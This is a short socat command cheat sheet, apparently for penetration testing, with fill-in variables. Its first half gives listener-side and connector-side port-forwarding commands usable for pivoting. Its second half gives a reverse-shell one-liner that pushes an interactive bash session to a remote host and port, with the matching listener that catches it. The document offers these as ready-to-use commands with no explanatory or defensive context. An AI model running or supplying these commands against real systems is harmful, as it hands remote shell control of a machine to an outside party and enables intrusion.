# Socat

## forward

### Listener side

Listen locally and forward incoming connections to another listening port.

```sh title:"Socat listener-side port forward"
./socat TCP-LISTEN:$listener_port,fork,reuseaddr TCP-LISTEN:$forward_port
```
<!-- cheat
var listener_port := 4444
var forward_port
-->

### Connector side

Connect back to a listener and forward to localhost.

```sh title:"Socat connector-side port forward"
./socat "TCP:$connect_ip:$connect_port" "TCP:127.0.0.1:$forward_port"
```
<!-- cheat
var connect_ip
var connect_port := 4444
var forward_port
-->

## shell

### Reverse shell

Send an interactive bash shell to a socat listener.

```sh title:"Socat reverse bash shell"
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane "tcp:$lhost:$lport"
```
<!-- cheat
var lhost
var lport := 4444
-->

### Reverse shell listener

Catch a socat reverse shell with TTY handling.

```sh title:"Socat reverse shell listener"
socat "file:$(tty),raw,echo=0" "tcp-listen:$lport"
```
<!-- cheat
var lport := 4444
-->
